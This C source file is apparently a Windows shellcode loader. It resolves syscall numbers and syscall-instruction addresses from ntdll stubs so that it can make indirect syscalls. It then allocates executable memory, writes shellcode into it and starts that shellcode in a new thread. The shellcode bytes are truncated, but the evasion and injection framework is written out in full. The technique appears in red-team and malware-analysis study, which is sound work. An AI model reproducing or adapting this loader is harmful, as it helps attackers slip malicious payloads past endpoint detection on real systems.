#include <windows.h>  
#include <stdio.h>    
#include "syscalls.h"


// Declare global variables to hold syscall numbers and addresses
DWORD wNtAllocateVirtualMemory;
UINT_PTR sysAddrNtAllocateVirtualMemory;

DWORD wNtWriteVirtualMemory;
UINT_PTR sysAddrNtWriteVirtualMemory;

DWORD wNtCreateThreadEx;
UINT_PTR sysAddrNtCreateThreadEx;

DWORD wNtWaitForSingleObject;
UINT_PTR sysAddrNtWaitForSingleObject;


int main() {
    PVOID allocBuffer = NULL;  // Declare a pointer to the buffer to be allocated
    SIZE_T buffSize = 0x1000;  // Declare the size of the buffer (4096 bytes)

    // Get a handle to the ntdll.dll library
    HANDLE hNtdll = GetModuleHandleA("ntdll.dll");

    // Get the address of the NtAllocateVirtualMemory function in the ntdll.dll module
    UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");

    // The system call number is stored at the beginning of the function in memory.
    // By convention, it is 4 bytes from the start of the function, so we add 4 to the function's address.
    // We cast the address to an unsigned char pointer, because we want to read one byte of data (the syscall number).
    wNtAllocateVirtualMemory = ((unsigned char*)(pNtAllocateVirtualMemory + 4))[0];

    // The syscall stub (actual system call instruction) is some bytes further into the function. 
    // In this case, it's assumed to be 0x12 (18 in decimal) bytes from the start of the function.
    // So we add 0x12 to the function's address to get the address of the system call instruction.
    sysAddrNtAllocateVirtualMemory = pNtAllocateVirtualMemory + 0x12;


    // Get the address of the NtWriteVirtualMemory function and its syscall number
    UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    wNtWriteVirtualMemory = ((unsigned char*)(pNtWriteVirtualMemory + 4))[0];
    sysAddrNtWriteVirtualMemory = pNtWriteVirtualMemory + 0x12;

    // Get the address of the NtCreateThreadEx function and its syscall number
    UINT_PTR pNtCreateThreadEx = (UINT_PTR)GetProcAddress(hNtdll, "NtCreateThreadEx");
    wNtCreateThreadEx = ((unsigned char*)(pNtCreateThreadEx + 4))[0];
    sysAddrNtCreateThreadEx = pNtCreateThreadEx + 0x12;

    // Get the address of the NtWaitForSingleObject function and its syscall number
    UINT_PTR pNtWaitForSingleObject = (UINT_PTR)GetProcAddress(hNtdll, "NtWaitForSingleObject");
    wNtWaitForSingleObject = ((unsigned char*)(pNtWaitForSingleObject + 4))[0];
    sysAddrNtWaitForSingleObject = pNtWaitForSingleObject + 0x12;

    // Use the NtAllocateVirtualMemory syscall to allocate memory for the shellcode
    NtAllocateVirtualMemory((HANDLE)-1, (PVOID*)&allocBuffer, (ULONG_PTR)0, &buffSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);

    // Define the shellcode to be injected
    unsigned char shellcode[] = "\xfc\x48\x83...";

    ULONG bytesWritten;
    // Use the NtWriteVirtualMemory syscall to write the shellcode into the allocated memory
    NtWriteVirtualMemory(GetCurrentProcess(), allocBuffer, shellcode, sizeof(shellcode), &bytesWritten);

    HANDLE hThread;
    // Use the NtCreateThreadEx syscall to create a new thread that starts executing the shellcode
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)allocBuffer, NULL, FALSE, 0, 0, 0, NULL);

    // Use the NtWaitForSingleObject syscall to wait for the new thread to finish executing
    NtWaitForSingleObject(hThread, FALSE, NULL);
}
